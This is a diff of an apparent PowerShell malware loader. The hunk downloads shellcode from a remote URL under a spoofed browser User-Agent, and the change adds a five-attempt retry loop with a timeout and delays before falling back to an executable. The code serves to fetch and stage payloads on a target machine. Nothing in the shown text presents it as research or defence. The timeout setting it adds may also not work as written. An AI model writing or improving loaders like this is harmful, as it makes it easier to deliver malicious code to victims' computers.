@@ -72,7 +72,32 @@ try {
     Write-DebugLog "Downloading shellcode from: $shellcodeUrl"
     $webClient = New-Object System.Net.WebClient
     $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    $webClient.DownloadFile($shellcodeUrl, $shellcodePath)
+    $webClient.Timeout = 300000  # 5 minutes timeout
+    
+    $retryCount = 0
+    $maxRetries = 5
+    $downloadSuccess = $false
+    
+    do {
+        try {
+            $retryCount++
+            Write-DebugLog "Download attempt $retryCount of $maxRetries"
+            $webClient.DownloadFile($shellcodeUrl, $shellcodePath)
+            $downloadSuccess = $true
+            Write-DebugLog "Shellcode download successful on attempt $retryCount"
+            break
+        } catch {
+            Write-DebugLog "Download attempt $retryCount failed: $($_.Exception.Message)"
+            if ($retryCount -lt $maxRetries) {
+                Write-DebugLog "Waiting 10 seconds before retry..."
+                Start-Sleep -Seconds 10
+            }
+        }
+    } while ($retryCount -lt $maxRetries -and -not $downloadSuccess)
+    
+    if (-not $downloadSuccess) {
+        Write-DebugLog "All download attempts failed, proceeding to EXE fallback"
+    }
     
     # === VERIFY DOWNLOAD ===
     if (Test-Path $shellcodePath) {
